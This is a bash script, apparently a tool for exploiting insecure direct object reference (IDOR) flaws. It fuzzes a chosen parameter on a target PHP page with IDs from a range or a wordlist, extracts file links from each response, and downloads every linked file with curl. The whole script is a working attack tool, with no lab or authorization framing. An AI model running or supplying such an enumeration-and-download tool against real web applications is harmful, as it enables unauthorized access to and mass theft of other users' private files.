#!/bin/bash

# Define the base URL
echo "Please enter URL you want to test for IDOR"
read url


# Prompt the user to select the HTTP method
echo "Select HTTP method: GET or POST"
read method

# Prompt for the directory to search
echo "Enter directory to search (e.g., 'uploads', omit the forward slash '/'): "
read directory

# Prompt for the parameter to fuzz
echo "Enter parameter name to fuzz (e.g., 'uid', omit the equals '='): "
read parameter

# Convert method to uppercase for consistency
method=${method^^}

# Ask the user if they want to use a range or a file list
echo "Do you want to use a range (R) or a file list (F)? Enter R or F:"
read choice

if [ "$choice" = "R" ] || [ "$choice" = "r" ]; then
    echo "Enter the start of the range:"
    read start
    echo "Enter the end of the range:"
    read end

    for i in $(seq $start $end); do
        # Check the selected HTTP method
        if [ "$method" == "GET" ]; then
            # Use curl for GET request
            response=$(curl -s "$url/$directory.php?$parameter=$i")
        elif [ "$method" == "POST" ]; then
            # Use curl for POST request
            response=$(curl -s -X POST --data "$parameter=$i" "$url/$directory.php")
        else
            echo "Invalid HTTP method selected."
            exit 1
        fi

        # Extract links from the response
        links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")

        # Download each link using curl
        for link in $links; do
            # Form the complete URL
            complete_url="${url}${link}"
            echo "Downloading: $complete_url"
            curl -s -O "$complete_url"
        done
    done

elif [ "$choice" = "F" ] || [ "$choice" = "f" ]; then
    echo "Enter the path to the file containing the list:"
    read -e -p "> " listPath

    while IFS= read -r line; do
        i=$line
        # Check the selected HTTP method
        if [ "$method" == "GET" ]; then
            # Use curl for GET request
            response=$(curl -s "$url/$directory.php?$parameter=$i")
        elif [ "$method" == "POST" ]; then
            # Use curl for POST request
            response=$(curl -s -X POST --data "$parameter=$i" "$url/$directory.php")
        else
            echo "Invalid HTTP method selected."
            exit 1
        fi

        # Extract links from the response
        links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")

        # Download each link using curl
        for link in $links; do
            # Form the complete URL
            complete_url="${url}${link}"
            echo "Downloading: $complete_url"
            curl -s -O "$complete_url"
        done
    done < "$listPath"

else
    echo "Invalid choice. Exiting."
    exit 1
fi
